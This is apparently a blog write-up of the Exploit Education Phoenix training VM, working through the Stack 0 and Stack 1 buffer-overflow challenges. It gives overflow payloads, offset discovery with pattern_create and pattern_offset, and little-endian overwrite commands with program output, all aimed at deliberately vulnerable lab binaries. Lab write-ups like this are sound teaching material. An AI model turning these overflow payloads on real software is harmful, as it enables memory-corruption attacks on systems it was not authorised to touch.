---
title: "Phoenix"
date: 2020-03-23T11:24:34-04:00
draft: false
description: "Adventures in Learning ROP (Return Oriented Programming) | Using Exploit-Exercises Phoenix VM Image"
---

**Description:** 

The Phoenix VM Image can be found here:  https://exploit.education/phoenix/

The virtual machine containers a number of vulnerable executables that allow students to learn stack, format-string, and heap-based overflows. The stack series contains executables stack 0-6. Format string vulnerabilities include format 0-4, and the heap vulnerabilitites include heap 0-3.  

# Stack 0

Running ./stack-zero provides us with a place to enter some data. Entering a random sequence "AAAA" gives us the output:  ```Uh oh, 'changeme' has not yet been changed. Would you like to try again?```

Trying to send the program even more data (since this is a BoF lab) results in a successful completion of the challenge. 
```
python -c 'print "A" * 100' | ./stack-zero

Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```


# Stack 1  

```bash
pattern_create.rb -l 100
```  

```bash
./stack-one Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A  

Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x63413163, we want 0x496c5962
```

```bash
pattern_offset -l 0x63413163

[*] Exact match at offset 64  
```  

Since we know there is a buffer size of 64 before we write to the changeme address space, we can write 64 bytes of garbage, followed by the intended value to store, written in little-endian so that it can be properly stored in memory. 

```bash
python -c 'print "A" * 64 + "\x62\x59\x6c\x49"'
```



The above will print 64 A's followed by the little-endian address.  

We can pass this to the stack-one executable as such:  


__python__
```bash
./stack-one $($python -c 'print "A" * 64" + "\x62\x59\x6c\x49"')
```
>Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value  


__python3__
```bash
./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
```

>Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value










